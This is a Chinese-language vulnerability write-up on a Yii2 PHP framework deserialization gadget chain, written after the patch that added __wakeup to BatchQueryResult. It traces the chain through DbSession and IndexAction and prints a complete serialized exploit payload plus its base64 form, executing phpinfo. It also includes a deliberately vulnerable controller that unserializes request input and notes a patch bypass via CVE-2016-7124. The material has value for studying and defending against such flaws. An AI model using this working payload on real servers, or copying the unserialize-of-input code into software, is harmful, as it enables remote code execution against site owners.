0x01.对比补丁
=========

![image.png](https://shs3.b.qianxin.com/butian_public/f56d9ecf795f13ea399be4e820f061cce.jpg)

发现在./yii2/db/BatchQueryResult.php中新增了**wakeup方法，在**wakeup方法中抛出了一个异常。

我们看下**wakeup方法的介绍：  
&gt; [unserialize()](https://www.php.net/manual/zh/function.unserialize.php) 会检查是否存在一个 \[**wakeup()\](<https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup>) 方法。如果存在，则会先调用 \_\_wakeup 方法，预先准备对象需要的资源。

用\_\_wakeup()方法抛出一个异常，其实是为了防止BatchQueryResult类被反序列化。

0x02.分析利用链
==========

其实在19年9月份，已经有师傅分析了这条利用链，结尾会放出链接。  
首先看yii2/db/BatchQueryResult类中，存在\_\_destruct方法：![image.png](https://shs3.b.qianxin.com/butian_public/ff2374cb437d2d11d3debcef03ef81f1e.jpg)  
看到$this-&gt;\_dataReader可控，这里有两条利用链可以走：

- 把$this-&gt;\_dataReader赋值为一个没有close方法的类，调用其\_\_call方法，从而实现代码执行
- 把$this-&gt;\_dataReader赋值为一个存在close方法的类，需要找到该close方法的调用过程中存在代码执行的调用。

![image.png](https://shs3.b.qianxin.com/butian_public/f80da3d8f4244c7e8038ddb837cfb7552.jpg)  
有23个实现了close方法的类，找到关键类：yii2/web/DbSession，代码如下：  
![image.png](https://shs3.b.qianxin.com/butian_public/f7aa774c9abed089f6d3053ff61338e4a.jpg)  
当$this-&gt;getIsActive为true时，则会调用composeFields方法。我们看下getIsActive的方法的实现：

```php
&lt;?php
// code from yii2/web/Session.php

public function getIsActive()
{
    return session_status() === PHP_SESSION_ACTIVE;
}
```

这里默认安装情况下都返回true，根据大佬描述说装了debug和gii插件，无论开不开启，都返回true。

然后跟进composeFields方法，该方法实现于它的父类：yii2/web/MultiFieldSession。  
![image.png](https://shs3.b.qianxin.com/butian_public/fc02d2cb104f5aed4966c1192b7e6b168.jpg)  
这里调用了call\_user\_func函数，并且函数名$this-&gt;writeCallback可控，但其参数不可控。可以用\[(new test),"aaa"\]来绕过，如果$this-&gt;writeCallback传入\[(new test),"aaa"\]，则会调用test类的公共方法aaa。

所以需要找到一个拥有可以执行命令的公共方法的类，比如：yii2/rest/IndexAction类的run方法，代码如下：  
![image.png](https://shs3.b.qianxin.com/butian_public/f8ebcfbe9c89e1a511a8f296dda5b135a.jpg)  
并且call\_user\_func的两个函数均可控。  
到这里利用链分析完毕，其实也是照葫芦画瓢，现学现卖的。

利用链如下：

```php
yii2/rest/IndexAction() -&gt;run()
yii2/web/MultiFieldSession() -&gt;composeFields() # 存在call_user_func，仅可控第一个参数
yii2/web/DbSession()-&gt;close()
yii2/db/BatchQueryResult()-&gt;reset()
yii2/db/BatchQueryResult()-&gt;__destruct()
```

0x03.通过利用链构造payload
===================

大佬们可能有了利用链很容易构造出payload，我比较菜也是折腾了很久才搞出来。  
因为看到文章中放了个工具叫：phpggc，今天一直用这个工具生成payload，但是都在反序列化的时候出错了。后来发现里面确实错了，少了一些属性。

- 实例化一个BatchQueryResult类，并设置其属性$\_dataReader

这里因为$\_dataReader是私有变量，所以要写一个函数来设置该变量的值。修改yii2/db/BatchQueryResult类的代码加上：

```php
    public function setDataReader($value){
        $this-&gt;_dataReader = $value;
    }
```

然后编写实例化代码：

```php
$bqrObj = new BatchQueryResult();
```

- 实例化yii2/web/DbSession类，并将对象赋值给$bqrObj的\_dataReader变量
- 实例化yii2/rest/IndexAction类，赋值给yii2/web/DbSession类的writeCallback变量： ```php
    // 现有代码
                $bqrObj = new BatchQueryResult();
        $bdsObj = new DbSession();
        $indexAction = new IndexAction();
        $bdsObj -&gt; writeCallback = array($indexAction,&quot;run&quot;);
        $bqrObj-&gt;setDataReader($bdsObj);
        var_dump(serialize($bqrObj));
    ```
    
    这里要注意实例化IndexAction类时，要注意其构造方法，实现于其父类的父类：\\yii\\base\\Action类  
    ![image.png](https://shs3.b.qianxin.com/butian_public/fce0db445b284db2bedb257b65cb65556.jpg)  
    然后跟进其父类Compoent的\_\_construct方法：  
    ![image.png](https://shs3.b.qianxin.com/butian_public/f48cbdf0e880c50d3f9e0734c0f1794ef.jpg)  
    继续看Yii::configure的实现：  
    ![image.png](https://shs3.b.qianxin.com/butian_public/f7374573e16cb9c14e9bb0cf8432a11d6.jpg)  
    其实就是便利字典格式数据，把数据以key为变量名，value为值设置给传入的对象。  
    所以构造demo：
    
    ```php
    public function actionSay($message = 'Hello')
    {
        $bqrObj = new BatchQueryResult();
        $bdsObj = new DbSession();
        $indexAction = new IndexAction(1,1); //config变量非必填
        $indexAction-&gt;checkAccess = 'phpinfo';
        $bdsObj -&gt; writeCallback = array($indexAction,&quot;run&quot;);
        $bqrObj-&gt;setDataReader($bdsObj);
        var_dump(serialize($bqrObj));
        return $this-&gt;render('say', ['message' =&gt; $message]);
    }
    ```
    
    然后访问web，如下：  
    ![image.png](https://shs3.b.qianxin.com/butian_public/fbbb40d24a34b72f20517e9a2187503cd.jpg)  
    出错，说是$this-&gt;modelClass为空，翻看附近的代码。  
    ![image.png](https://shs3.b.qianxin.com/butian_public/f1bf56f2b36e2451996a94c1dcf206ff7.jpg)  
    所以构造demo：  
    ![image.png](https://shs3.b.qianxin.com/butian_public/fb6243236e928a2ecf4b61bb5c1afafa3.jpg)  
    但是：  
    ![image.png](https://shs3.b.qianxin.com/butian_public/fcb77dd50256bd8cf1455378a22f3efac.jpg)  
    仍然显示$this-&gt;modelClass未设置，究其原因，是因为实例化的是indexAction而不是yii2/rest/Action类，所以直接$indexAction-&gt;modelClass设置不了yii2/rest/Action的modelClass的值。

这时候想到yii2/base/Action类中的\_\_construct方法，可以设置变量，而yii2/rest/Action是yii2/base/Action的子类，可以继承其属性和方法。  
所以修改demo：  
![image.png](https://shs3.b.qianxin.com/butian_public/ff9d5dffa38134b5d3b950254d3e2bb01.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f3e9619145340615e479a60deb4aa3634.jpg)  
phpinfo成功执行，payload为：

```php
O:23:&quot;yii\db\BatchQueryResult&quot;:9:{s:2:&quot;db&quot;;N;s:5:&quot;query&quot;;N;s:9:&quot;batchSize&quot;;i:100;s:4:&quot;each&quot;;b:0;s:36:&quot; yii\db\BatchQueryResult _dataReader&quot;;O:17:&quot;yii\web\DbSession&quot;:13:{s:2:&quot;db&quot;;O:17:&quot;yii\db\Connection&quot;:37:{s:3:&quot;dsn&quot;;s:37:&quot;mysql:host=localhost;dbname=yii2basic&quot;;s:8:&quot;username&quot;;s:4:&quot;root&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:10:&quot;attributes&quot;;N;s:17:&quot;enableSchemaCache&quot;;b:0;s:19:&quot;schemaCacheDuration&quot;;i:3600;s:18:&quot;schemaCacheExclude&quot;;a:0:{}s:11:&quot;schemaCache&quot;;s:5:&quot;cache&quot;;s:16:&quot;enableQueryCache&quot;;b:1;s:18:&quot;queryCacheDuration&quot;;i:3600;s:10:&quot;queryCache&quot;;s:5:&quot;cache&quot;;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:14:&quot;emulatePrepare&quot;;N;s:11:&quot;tablePrefix&quot;;s:0:&quot;&quot;;s:9:&quot;schemaMap&quot;;a:10:{s:5:&quot;pgsql&quot;;s:19:&quot;yii\db\pgsql\Schema&quot;;s:6:&quot;mysqli&quot;;s:19:&quot;yii\db\mysql\Schema&quot;;s:5:&quot;mysql&quot;;s:19:&quot;yii\db\mysql\Schema&quot;;s:6:&quot;sqlite&quot;;s:20:&quot;yii\db\sqlite\Schema&quot;;s:7:&quot;sqlite2&quot;;s:20:&quot;yii\db\sqlite\Schema&quot;;s:6:&quot;sqlsrv&quot;;s:19:&quot;yii\db\mssql\Schema&quot;;s:3:&quot;oci&quot;;s:17:&quot;yii\db\oci\Schema&quot;;s:5:&quot;mssql&quot;;s:19:&quot;yii\db\mssql\Schema&quot;;s:5:&quot;dblib&quot;;s:19:&quot;yii\db\mssql\Schema&quot;;s:6:&quot;cubrid&quot;;s:20:&quot;yii\db\cubrid\Schema&quot;;}s:8:&quot;pdoClass&quot;;N;s:12:&quot;commandClass&quot;;s:14:&quot;yii\db\Command&quot;;s:10:&quot;commandMap&quot;;a:10:{s:5:&quot;pgsql&quot;;s:14:&quot;yii\db\Command&quot;;s:6:&quot;mysqli&quot;;s:14:&quot;yii\db\Command&quot;;s:5:&quot;mysql&quot;;s:14:&quot;yii\db\Command&quot;;s:6:&quot;sqlite&quot;;s:21:&quot;yii\db\sqlite\Command&quot;;s:7:&quot;sqlite2&quot;;s:21:&quot;yii\db\sqlite\Command&quot;;s:6:&quot;sqlsrv&quot;;s:14:&quot;yii\db\Command&quot;;s:3:&quot;oci&quot;;s:18:&quot;yii\db\oci\Command&quot;;s:5:&quot;mssql&quot;;s:14:&quot;yii\db\Command&quot;;s:5:&quot;dblib&quot;;s:14:&quot;yii\db\Command&quot;;s:6:&quot;cubrid&quot;;s:14:&quot;yii\db\Command&quot;;}s:15:&quot;enableSavepoint&quot;;b:1;s:17:&quot;serverStatusCache&quot;;s:5:&quot;cache&quot;;s:19:&quot;serverRetryInterval&quot;;i:600;s:12:&quot;enableSlaves&quot;;b:1;s:6:&quot;slaves&quot;;a:0:{}s:11:&quot;slaveConfig&quot;;a:0:{}s:7:&quot;masters&quot;;a:0:{}s:12:&quot;masterConfig&quot;;a:0:{}s:14:&quot;shuffleMasters&quot;;b:1;s:13:&quot;enableLogging&quot;;b:1;s:15:&quot;enableProfiling&quot;;b:1;s:8:&quot;isSybase&quot;;b:0;s:30:&quot; yii\db\Connection _driverName&quot;;N;s:34:&quot; yii\db\Connection _queryCacheInfo&quot;;a:0:{}s:36:&quot; yii\db\Connection _quotedTableNames&quot;;N;s:37:&quot; yii\db\Connection _quotedColumnNames&quot;;N;s:27:&quot; yii\base\Component _events&quot;;a:0:{}s:35:&quot; yii\base\Component _eventWildcards&quot;;a:0:{}s:30:&quot; yii\base\Component _behaviors&quot;;N;}s:12:&quot;sessionTable&quot;;s:12:&quot;{{%session}}&quot;;s:9:&quot; * fields&quot;;a:0:{}s:12:&quot;readCallback&quot;;N;s:13:&quot;writeCallback&quot;;a:2:{i:0;O:20:&quot;yii\rest\IndexAction&quot;:10:{s:19:&quot;prepareDataProvider&quot;;N;s:10:&quot;dataFilter&quot;;N;s:10:&quot;modelClass&quot;;s:21:&quot;ActiveRecordInterface&quot;;s:9:&quot;findModel&quot;;N;s:11:&quot;checkAccess&quot;;s:7:&quot;phpinfo&quot;;s:2:&quot;id&quot;;i:1;s:10:&quot;controller&quot;;i:1;s:27:&quot; yii\base\Component _events&quot;;a:0:{}s:35:&quot; yii\base\Component _eventWildcards&quot;;a:0:{}s:30:&quot; yii\base\Component _behaviors&quot;;N;}i:1;s:3:&quot;run&quot;;}s:10:&quot;flashParam&quot;;s:7:&quot;__flash&quot;;s:7:&quot;handler&quot;;N;s:30:&quot; yii\web\Session _cookieParams&quot;;a:1:{s:8:&quot;httponly&quot;;b:1;}s:34:&quot; yii\web\Session frozenSessionData&quot;;N;s:30:&quot; yii\web\Session _hasSessionId&quot;;N;s:27:&quot; yii\base\Component _events&quot;;a:0:{}s:35:&quot; yii\base\Component _eventWildcards&quot;;a:0:{}s:30:&quot; yii\base\Component _behaviors&quot;;N;}s:31:&quot; yii\db\BatchQueryResult _batch&quot;;N;s:31:&quot; yii\db\BatchQueryResult _value&quot;;N;s:29:&quot; yii\db\BatchQueryResult _key&quot;;N;s:49:&quot; yii\db\BatchQueryResult mssqlNoMoreRowsErrorCode&quot;;i:-13;}
```

0x04.构造有存在漏洞的demo验证
===================

修改根目录下的controllers/SiteController.php文件，添加一代码：

```php
    public function actionSay($message = 'Hello')
    {

        $data = base64_decode($message);
        unserialize($data);
        return $this-&gt;response($data);
    }
```

将payload进行base64编码：

```json
TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjk6e3M6MjoiZGIiO047czo1OiJxdWVyeSI7TjtzOjk6ImJhdGNoU2l6ZSI7aToxMDA7czo0OiJlYWNoIjtiOjA7czozNjoiAHlpaVxkYlxCYXRjaFF1ZXJ5UmVzdWx0AF9kYXRhUmVhZGVyIjtPOjE3OiJ5aWlcd2ViXERiU2Vzc2lvbiI6MTM6e3M6MjoiZGIiO086MTc6InlpaVxkYlxDb25uZWN0aW9uIjozNzp7czozOiJkc24iO3M6Mzc6Im15c3FsOmhvc3Q9bG9jYWxob3N0O2RibmFtZT15aWkyYmFzaWMiO3M6ODoidXNlcm5hbWUiO3M6NDoicm9vdCI7czo4OiJwYXNzd29yZCI7czowOiIiO3M6MTA6ImF0dHJpYnV0ZXMiO047czoxNzoiZW5hYmxlU2NoZW1hQ2FjaGUiO2I6MDtzOjE5OiJzY2hlbWFDYWNoZUR1cmF0aW9uIjtpOjM2MDA7czoxODoic2NoZW1hQ2FjaGVFeGNsdWRlIjthOjA6e31zOjExOiJzY2hlbWFDYWNoZSI7czo1OiJjYWNoZSI7czoxNjoiZW5hYmxlUXVlcnlDYWNoZSI7YjoxO3M6MTg6InF1ZXJ5Q2FjaGVEdXJhdGlvbiI7aTozNjAwO3M6MTA6InF1ZXJ5Q2FjaGUiO3M6NToiY2FjaGUiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjE0OiJlbXVsYXRlUHJlcGFyZSI7TjtzOjExOiJ0YWJsZVByZWZpeCI7czowOiIiO3M6OToic2NoZW1hTWFwIjthOjEwOntzOjU6InBnc3FsIjtzOjE5OiJ5aWlcZGJccGdzcWxcU2NoZW1hIjtzOjY6Im15c3FsaSI7czoxOToieWlpXGRiXG15c3FsXFNjaGVtYSI7czo1OiJteXNxbCI7czoxOToieWlpXGRiXG15c3FsXFNjaGVtYSI7czo2OiJzcWxpdGUiO3M6MjA6InlpaVxkYlxzcWxpdGVcU2NoZW1hIjtzOjc6InNxbGl0ZTIiO3M6MjA6InlpaVxkYlxzcWxpdGVcU2NoZW1hIjtzOjY6InNxbHNydiI7czoxOToieWlpXGRiXG1zc3FsXFNjaGVtYSI7czozOiJvY2kiO3M6MTc6InlpaVxkYlxvY2lcU2NoZW1hIjtzOjU6Im1zc3FsIjtzOjE5OiJ5aWlcZGJcbXNzcWxcU2NoZW1hIjtzOjU6ImRibGliIjtzOjE5OiJ5aWlcZGJcbXNzcWxcU2NoZW1hIjtzOjY6ImN1YnJpZCI7czoyMDoieWlpXGRiXGN1YnJpZFxTY2hlbWEiO31zOjg6InBkb0NsYXNzIjtOO3M6MTI6ImNvbW1hbmRDbGFzcyI7czoxNDoieWlpXGRiXENvbW1hbmQiO3M6MTA6ImNvbW1hbmRNYXAiO2E6MTA6e3M6NToicGdzcWwiO3M6MTQ6InlpaVxkYlxDb21tYW5kIjtzOjY6Im15c3FsaSI7czoxNDoieWlpXGRiXENvbW1hbmQiO3M6NToibXlzcWwiO3M6MTQ6InlpaVxkYlxDb21tYW5kIjtzOjY6InNxbGl0ZSI7czoyMToieWlpXGRiXHNxbGl0ZVxDb21tYW5kIjtzOjc6InNxbGl0ZTIiO3M6MjE6InlpaVxkYlxzcWxpdGVcQ29tbWFuZCI7czo2OiJzcWxzcnYiO3M6MTQ6InlpaVxkYlxDb21tYW5kIjtzOjM6Im9jaSI7czoxODoieWlpXGRiXG9jaVxDb21tYW5kIjtzOjU6Im1zc3FsIjtzOjE0OiJ5aWlcZGJcQ29tbWFuZCI7czo1OiJkYmxpYiI7czoxNDoieWlpXGRiXENvbW1hbmQiO3M6NjoiY3VicmlkIjtzOjE0OiJ5aWlcZGJcQ29tbWFuZCI7fXM6MTU6ImVuYWJsZVNhdmVwb2ludCI7YjoxO3M6MTc6InNlcnZlclN0YXR1c0NhY2hlIjtzOjU6ImNhY2hlIjtzOjE5OiJzZXJ2ZXJSZXRyeUludGVydmFsIjtpOjYwMDtzOjEyOiJlbmFibGVTbGF2ZXMiO2I6MTtzOjY6InNsYXZlcyI7YTowOnt9czoxMToic2xhdmVDb25maWciO2E6MDp7fXM6NzoibWFzdGVycyI7YTowOnt9czoxMjoibWFzdGVyQ29uZmlnIjthOjA6e31zOjE0OiJzaHVmZmxlTWFzdGVycyI7YjoxO3M6MTM6ImVuYWJsZUxvZ2dpbmciO2I6MTtzOjE1OiJlbmFibGVQcm9maWxpbmciO2I6MTtzOjg6ImlzU3liYXNlIjtiOjA7czozMDoiAHlpaVxkYlxDb25uZWN0aW9uAF9kcml2ZXJOYW1lIjtOO3M6MzQ6IgB5aWlcZGJcQ29ubmVjdGlvbgBfcXVlcnlDYWNoZUluZm8iO2E6MDp7fXM6MzY6IgB5aWlcZGJcQ29ubmVjdGlvbgBfcXVvdGVkVGFibGVOYW1lcyI7TjtzOjM3OiIAeWlpXGRiXENvbm5lY3Rpb24AX3F1b3RlZENvbHVtbk5hbWVzIjtOO3M6Mjc6IgB5aWlcYmFzZVxDb21wb25lbnQAX2V2ZW50cyI7YTowOnt9czozNToiAHlpaVxiYXNlXENvbXBvbmVudABfZXZlbnRXaWxkY2FyZHMiO2E6MDp7fXM6MzA6IgB5aWlcYmFzZVxDb21wb25lbnQAX2JlaGF2aW9ycyI7Tjt9czoxMjoic2Vzc2lvblRhYmxlIjtzOjEyOiJ7eyVzZXNzaW9ufX0iO3M6OToiACoAZmllbGRzIjthOjA6e31zOjEyOiJyZWFkQ2FsbGJhY2siO047czoxMzoid3JpdGVDYWxsYmFjayI7YToyOntpOjA7TzoyMDoieWlpXHJlc3RcSW5kZXhBY3Rpb24iOjEwOntzOjE5OiJwcmVwYXJlRGF0YVByb3ZpZGVyIjtOO3M6MTA6ImRhdGFGaWx0ZXIiO047czoxMDoibW9kZWxDbGFzcyI7czoyMToiQWN0aXZlUmVjb3JkSW50ZXJmYWNlIjtzOjk6ImZpbmRNb2RlbCI7TjtzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtpOjE7czoxMDoiY29udHJvbGxlciI7aToxO3M6Mjc6IgB5aWlcYmFzZVxDb21wb25lbnQAX2V2ZW50cyI7YTowOnt9czozNToiAHlpaVxiYXNlXENvbXBvbmVudABfZXZlbnRXaWxkY2FyZHMiO2E6MDp7fXM6MzA6IgB5aWlcYmFzZVxDb21wb25lbnQAX2JlaGF2aW9ycyI7Tjt9aToxO3M6MzoicnVuIjt9czoxMDoiZmxhc2hQYXJhbSI7czo3OiJfX2ZsYXNoIjtzOjc6ImhhbmRsZXIiO047czozMDoiAHlpaVx3ZWJcU2Vzc2lvbgBfY29va2llUGFyYW1zIjthOjE6e3M6ODoiaHR0cG9ubHkiO2I6MTt9czozNDoiAHlpaVx3ZWJcU2Vzc2lvbgBmcm96ZW5TZXNzaW9uRGF0YSI7TjtzOjMwOiIAeWlpXHdlYlxTZXNzaW9uAF9oYXNTZXNzaW9uSWQiO047czoyNzoiAHlpaVxiYXNlXENvbXBvbmVudABfZXZlbnRzIjthOjA6e31zOjM1OiIAeWlpXGJhc2VcQ29tcG9uZW50AF9ldmVudFdpbGRjYXJkcyI7YTowOnt9czozMDoiAHlpaVxiYXNlXENvbXBvbmVudABfYmVoYXZpb3JzIjtOO31zOjMxOiIAeWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQAX2JhdGNoIjtOO3M6MzE6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfdmFsdWUiO047czoyOToiAHlpaVxkYlxCYXRjaFF1ZXJ5UmVzdWx0AF9rZXkiO047czo0OToiAHlpaVxkYlxCYXRjaFF1ZXJ5UmVzdWx0AG1zc3FsTm9Nb3JlUm93c0Vycm9yQ29kZSI7aTotMTM7fQ==
```

![image.png](https://shs3.b.qianxin.com/butian_public/f314cebd8c4125d683f89cd857d6da666.jpg)

0x05.补丁绕过分析
===========

可参考CVE-2016-7124漏洞php的\_\_wakeup方法绕过。  
CVE-2016-7124的影响范围：

- PHP5 &lt; 5.6.25
- PHP7 &lt; 7.0.10

也就是说在低版本的php当中，可能会造成补丁失效，暂未测试。